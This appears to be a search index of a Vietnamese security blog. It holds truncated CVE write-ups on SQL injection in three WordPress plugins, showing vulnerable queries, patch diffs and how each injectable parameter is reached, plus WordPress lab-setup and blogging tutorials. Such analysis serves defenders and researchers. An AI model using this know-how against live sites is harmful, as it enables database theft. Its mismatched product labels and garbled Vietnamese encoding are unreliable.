'sanitize_callback' =\u003e 'rest_sanitize_array","date":"2025-09-25","objectID":"/vi/posts/2025-09-25-cve-2025-58604/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-58604 Analysis \u0026 POC","uri":"/vi/posts/2025-09-25-cve-2025-58604/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Easy Quotes Plugin.","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analyst"],"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Easy Quotes c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.2.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin. CVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Taskbuilder Plugin: v1.2.2(vul) v√† v1.2.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra. Patch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/quotes-data.php private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; return $wpdb-\u003eget_row(\"SELECT * FROM `\".$tablename.\"` WHERE `family`='\".$family.\"';\"); } B·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u003eprepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query. private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; $sql = $wpdb-\u003eprepare( \"SELECT * FROM %i WHERE `family` = %s\", $tablename, $family ); return $wpdb-\u003eget_row($sql); } Patch diff C√≥ nhi·ªÅu h√†m c≈©ng ƒë∆∞·ª£c v√° b·∫±ng c√°ch tr√™n, nh∆∞: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1) Tuy get_fonts_categories() ƒë√£ ƒë∆∞·ª£c v√° nh∆∞ng n√≥ kh√¥ng ch·ª©a d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng, n√™n kh√¥ng c·∫ßn quan t√¢m public static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-categories'; $sql = $wpdb-\u003eprepare( \"SELECT `category_id`, `category` FROM %i\", $tablename ); return $wpdb-\u003eget_results($sql); } How it work? Ta khai th√°c l·ªói SQL Injection trong h√†m get_family_data($family), c√°c h√†m c√≤n l·∫°i khai th√°c t∆∞∆°ng t·ª±. get_family_data() l√† h√†m public trong class Quotes_Data class Quotes_Data { function __construct() { add_filter('posts_where', array($this, 'posts_where'), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u003eprefix . 'easy-quotes-families'; return $wpdb-\u003eget_row(\"SELECT * FROM `\".$tablename.\"` WHERE `family`='\".$family.\"';\"); } } get_family_data() ƒë∆∞·ª£c g·ªçi trong 2 h√†m get_family() v√† get_font_variants() c·ªßa class Quotes_Data, ƒë·ªÉ bi·∫øt ch√∫ng s·ª≠ d·ª•ng ·ªü ƒë√¢u, ta t√¨m ki·∫øn v·ªõi t·ª´ kh√≥a get_family ho·∫∑c get_font_variants Search function H√†m get_font_variants() ƒë∆∞·ª£c g·ªçi trong h√†m rest_route_callback_font_variants() c·ªßa class Quotes_Rest_Route class Quotes_Rest_Route { function __construct() { add_action('rest_api_init', array($this, 'rest_api_init')); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ 'method' =\u003e WP_REST_Server::READABLE, 'callback' =\u003e [$this, 'rest_route_callback_quote'], 'permission_callback' =\u003e '__return_true' ]; register_rest_route('layart/v1', '/quote', $args); // other logic $args['callback'] = [$this, 'rest_route_callback_font_variants']; register_rest_route('layart/v1', '/font-variants', $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u003eget_param('family'); $family = isset($family) ? $family : \"Shadows Into Light\"; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } H√†m kh·ªüi t·∫°o c·ªßa class Quotes_Rest_Route s·ª≠ d·ª•ng add_action(hook_name, callback) v·ªõi hook_name l√† rest_","date":"2025-09-23","objectID":"/vi/posts/2025-09-23-cve-2025-26943/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-26943 Analysis \u0026 POC","uri":"/vi/posts/2025-09-23-cve-2025-26943/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Taskbuilder Plugin.","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analyst"],"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Taskbuilder c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.0.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin. CVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Taskbuilder Plugin: v4.0.1(vul) v√† v4.0.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n '...'. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ OR, AND,...) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection. Patch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/admin/projects/get_users.php Trong phi√™n b·∫£n v4.0.1, bi·∫øn $proj_id sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row( \"SELECT * FROM {$wpdb-\u003eprefix}wppm_project where id = $proj_id\" ); ·ªû b·∫£n v4.0.2, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t $proj_id trong d·∫•u nh√°y ƒë∆°n sau khi escape: $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row( \"SELECT * FROM {$wpdb-\u003eprefix}wppm_project where id = '$proj_id'\" ); B·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã $proj_id sau khi escape ƒë∆∞·ª£c coi l√† m·ªôt chu·ªói literal, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection. Patch diff How it work? File architecture: C·∫•u tr√∫c chung c·ªßa file hi·ªán t·∫°i $proj_id = esc_sql($proj_id); $project = $wpdb-\u003eget_row(\"SELECT * FROM {$wpdb-\u003eprefix}wppm_project WHERE id = $proj_id\"); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal ob_start(); // ... render HTML danh s√°ch users $body = ob_get_clean(); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal ob_start(); // ... render HTML c√°c n√∫t thao t√°c (Close, Save) $footer = ob_get_clean(); // Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal echo json_encode([ 'body' =\u003e $body, 'footer' =\u003e $footer, ]); $proj_id / $project: L·∫•y d·ªØ li·ªáu project t·ª´ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn. $body / $footer: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal. json_encode(): Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang. File n·∫±m trong th∆∞ m·ª•c includes cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_users.php trong th∆∞ m·ª•c ch·ª©a plugin. Search users üëâ N√≥ ƒë∆∞·ª£c include trong h√†m wppm_get_users() c·ªßa class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() l√† callback c·ªßa action hook trong WordPress. WPPM_Admin construct: final class WPPM_Admin { // constructor public function __construct() { // other action add_action( 'wp_ajax_wppm_get_users',array($this,'wppm_get_users')); // array($this,'wppm_get_users')) = $this::wppm_get_users() // other action } } add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. wp_ajax_wppm_get_users l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n: wp_ajax_{action} =\u003e X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p. wp_ajax_nopriv_{action} =\u003e X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p. ·ªû ƒë√¢y, action = wppm_get_users. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i action=wppm_get_users t·ªõi admin-ajax.php, th√¨ WordPress s·∫Ω t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω, ·ªü ƒë√¢y l√† wppm_get_users(). üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c action = wppm_get_users, ki·ªÉm tra xem Ajax n√†o s·ª≠ d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a wppm_get_users tr√™n c√°c file .js trong th∆∞ m·ª•c ch·ª©a plugin. Ajax search Action wppm_get_users l√† ph·∫ßn data trong request POST c·ªßa h√†m wppm_get_users() H√†m wppm_get_users() s·∫Ω ƒë","date":"2025-09-22","objectID":"/vi/posts/2025-09-22-cve-2025-39569/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39569 Analysis \u0026 POC","uri":"/vi/posts/2025-09-22-cve-2025-39569/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Hostel Plugin.","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/"},{"categories":["CVE Analyst"],"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do d·ªØ li·ªáu ƒë·∫ßu v√†o kh√¥ng ƒë∆∞·ª£c x·ª≠ l√Ω ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng t∆∞∆°ng t√°c tr·ª±c ti·∫øp v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm nh∆∞ng kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp d·ªØ li·ªáu. CVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Summary: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë ob trong ph·∫ßn Manage Bookings. Background Hostel Plugin cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p: Form ƒë·∫∑t ph√≤ng L·ªãch ph√≤ng Qu·∫£n l√Ω bookings Exploitation Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Code Comparison S·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version if(!empty($_GET['ob'])) { $orderby = \"ORDER BY \".sanitize_text_field($_GET['ob']) . ' ' . $dir; } if(!empty($_GET['ob'])) { $ob = sanitize_text_field($_GET['ob']); if(!in_array($ob, ['tB.id', 'tB.contact_name', 'tB.contact_email', 'tB.from_date', 'tB.amount_paid', 'tB.status'])) { $ob = 'tB.id'; } $orderby = \"ORDER BY $ob $dir\"; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'. Analysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi. Detect SQLi ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); C·∫•u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch. To√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings. class WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET['do']) { case 'add': // add handle break; case 'edit': // edit handle break; // view/print booking details. Will allow also to confirm/cancel case 'view': // view handle break; // list bookings default: // another logic if(!empty($_GET['ob'])) { $orderby = \"ORDER BY \".sanitize_text_field($_GET['ob']) . ' ' . $dir; } $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \"manage\" trong th∆∞ m·ª•c ch·ª©a plugin. Search Trong file models/hostel.php ta c√≥ h√†m: class class WPHostel { // another logic static function menu() { // we use 'hostelpro_manage' for consistency with the pro version $wphostel_caps = current_user_can('manage_options') ? 'manage_options' : 'hostelpro_manage'; add_menu_page(__('Hostel', 'wphostel'), __('Hostel', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); add_submenu_page('wphostel_options', __('Settings', 'wphostel'), __('Settings', 'wphostel'), $wphostel_caps, \"wphostel_options\", array(__CLASS__, \"options\")); add_submenu_page('wphostel_options', __(\"Manage Rooms\", 'wphostel'), __(\"Manage Rooms\", 'wphostel'), $wphostel_caps, 'wphostel_rooms', array('WPHostelRooms', \"manage\")); add_submenu_page('wphostel_options', __(\"Manage Bookings\", 'wphostel'), __(\"Manage Bookings\", 'wphostel'), $wphostel_caps, 'wphostel_bookings', array('WPHostelBookings', \"manage\")); add_submenu_page('wphostel_options', __(\"Unavailable Dates\", 'wphostel'), __(\"Unavailable Dates\", 'wphostel'), $wphostel_caps, 'wphostel_unavailable', array('WPHostelBookings', \"unavailable\")); add_submenu_","date":"2025-09-21","objectID":"/vi/posts/2025-09-21-cve-2025-39566/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-39566 Analysis \u0026 POC","uri":"/vi/posts/2025-09-21-cve-2025-39566/"},{"categories":["Web"],"content":"A powerful and the most popular content management system (CMS).","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Web"],"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB. Ra ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress: WordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024 Most Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u003e c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04): Kh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng). sudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web. # T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng: curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro: Ubuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress: # L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u003cVirtualHost *:80\u003e # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u003cDirectory /srv/www/wordpress\u003e Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u003c/Directory\u003e # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:0:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/"},{"categories":["Web"],"content":"How to create your personal blog using Github Pages with \"comment\" feature","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"content":"Khi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus. Github Pages: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng. Jekyll: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥. Giscus: M·ªôt h·ªá th·ªëng b√¨nh lu·∫≠n hi·ªán ƒë·∫°i d·ª±a tr√™n GitHub Discussions. Thay v√¨ ph·∫£i d√πng d·ªãch v·ª• ngo√†i nh∆∞ Disqus, b·∫°n c√≥ th·ªÉ t·∫≠n d·ª•ng GitHub ƒë·ªÉ qu·∫£n l√Ω comment, v·ª´a g·ªçn nh·∫π v·ª´a th√¢n thi·ªán v·ªõi developer. Requirements T√†i kho·∫£n Github Ki·∫øn th·ª©c c∆° b·∫£n v·ªÅ Markdown Creating a Site Repository ·ªû ƒë√¢y, t√¥i s·ª≠ d·ª•ng Chirpy themes, ƒë√¢y l√† theme kh√° n·ªïi ti·∫øng d√†nh cho GitHub Pages, ƒë∆∞·ª£c t·ªëi ∆∞u cho vi·ªác vi·∫øt blog c√° nh√¢n ho·∫∑c technical blog. C√°c 